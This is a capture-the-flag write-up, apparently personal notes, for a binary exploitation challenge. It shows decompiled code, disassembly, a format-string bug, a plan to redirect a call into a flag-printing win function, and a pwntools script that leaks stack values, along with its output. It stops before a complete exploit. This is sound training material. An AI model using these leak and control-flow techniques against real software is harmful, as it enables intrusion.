
![[chall]]


| RELRO         | STACK CANARY | NX        | PIE   | RPATH | RUNPATH | Symbols | FORTIFY | Fortified | Fortifiable | FILE  |
|---------------|--------------|-----------|-------|-------|---------|---------|---------|-----------|-------------|-------|
| Partial RELRO | Canary found  | NX enabled| No PIE| No RPATH | No RUNPATH| 48 Symbols | No      | 0         | 2           | chall |


```
└─$ file chall 
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f041a6eba0e7557961bb783a363f0cb0bbb3eb8b, for GNU/Linux 3.2.0, not stripped
```

```
undefined8 main(EVP_PKEY_CTX *param_1)

{
  init(param_1);
  vuln();
  return 0;
}
```

Very simple main function - directly calls a vuln function

```
undefined8 vuln(void)

{
  long in_FS_OFFSET;
  undefined8 uStack_58;
  byte local_4c [4];
  uint local_48;
  uint local_44;
  undefined8 local_40;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_40 = 0;
  puts("which stack position do you want to use?");
  __isoc99_scanf(&DAT_004020c9,&local_44);
  local_44 = local_44 << 3;
  local_40 = *(undefined8 *)((long)&uStack_58 + (ulong)local_44);
  puts("you have one chance to modify a byte by xor.");
  puts("Byte Index?");
  __isoc99_scanf(&DAT_004020c9,&local_48);
  if (((int)local_48 < 0) || (7 < (int)local_48)) {
    puts("don\'t cheat!");
    FUN_00401120(0);
  }
  puts("xor with?");
  __isoc99_scanf(&DAT_004020c9,local_4c);
  local_38[(ulong)local_48 - 8] = local_38[(ulong)local_48 - 8] ^ local_4c[0];
  puts("finally, do you have any feedback? it will surely help us improve our service.");
  __isoc99_scanf("%20[^@]",local_38);
  printf(local_38);
  bye();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
```

Then we have the win function:

```
└─$ undefined8 win(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_48 [56];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("flag.txt not found!");
    FUN_00401120(0);
  }
  fgets(local_48,0x32,__stream);
  puts(local_48);
  puts("How could you do that?!");
  puts("That\'s my precious secret.");
  puts("Anyway congratulations");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Interestingly, the `bye()` function that is called is close to the win function, 

```
0000000000401299 <bye>:
  401299:       f3 0f 1e fa             endbr64
  40129d:       55                      push   %rbp
  40129e:       48 89 e5                mov    %rsp,%rbp
  4012a1:       48 8d 05 60 0d 00 00    lea    0xd60(%rip),%rax        # 402008 <_IO_stdin_used+0x8>
  4012a8:       48 89 c7                mov    %rax,%rdi
  4012ab:       e8 00 fe ff ff          call   4010b0 <puts@plt>
  4012b0:       bf 00 00 00 00          mov    $0x0,%edi
  4012b5:       e8 66 fe ff ff          call   401120 <exit@plt>

00000000004012ba <win>:
```

All we have to do is modify the lowest byte of the `bye()` function that is called and replace it with `0xba`

The vuln function contains a format string vulnerability here:

```
  __isoc99_scanf("%20[^@]",local_38);
  printf(local_38);
  bye();```
```
This regex allows us 20 chars with the exception of @. First, let's try and find some information about where we are on the stack, and where the bye function address is stored:

Fuzz.py:

```
#!/usr/bin/env python3
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./chall', checksec=False)

# Let's fuzz 100 values
for i in range(100):
    try:    
        p = process(level='error')
        p.sendlineafter(b'use?', b'0')  
        p.sendlineafter(b'dex?\n', b'0')
        p.sendlineafter(b'with?', b'0')
        p.recvuntil(b'service.')        
        p.sendline('%{}$p@'.format(i).encode())
        p.recvline() 
        p.recvline() 
        result = p.recvline()
        result_str = result.decode('utf-8')
        split_result = result_str.split("Thanks")        
        print(str(i) + ': ' + str(split_result[0]))
        p.close()
    except EOFError:
        pass
```

fuzzing the server
```
0: %0$lx
1: 40
2: 0
3: 7cd78e8557e2
4: 0
5: 7ffe0854c260
6: 7ec407567600
7: 3a5a45ad
8: 0
9: 7e2ac3366600
10: 786c243031250a
11: 7ffc97544450
12: 7ffc2a293648
13: 4014de
14: 403e18
15: 206b6c6a4e841000
16: 7ffc411bee80
17: 4014fa
18: 1
19: 7c214625ed90
20: 0
21: 4014de
22: 100000000
23: 7ffd6b8f3898
24: 0
25: 5c018b557236584e
26: 7ffe3a05e5a8
27: 4014de
28: 403e18
29: 7c8e23e75040
30: cd2327adf99ba74e
31: cab135d4eb1376fb
32: 0
33: 0
34: 0
35: 0
36: 0
37: d6c5bb42a2e49d00
38: 0
39: 7a078dd98e40
40: 7ffc5d0b1348
41: 403e18
42: 7fb909c042e0
43: 0
44: 0
45: 401130
46: 7ffca8c1c590
47: 0
48: 0
49: 401155
50: 7ffd7807d108
51: 1c
52: 1
53: 7ffd0e78ffd6

```

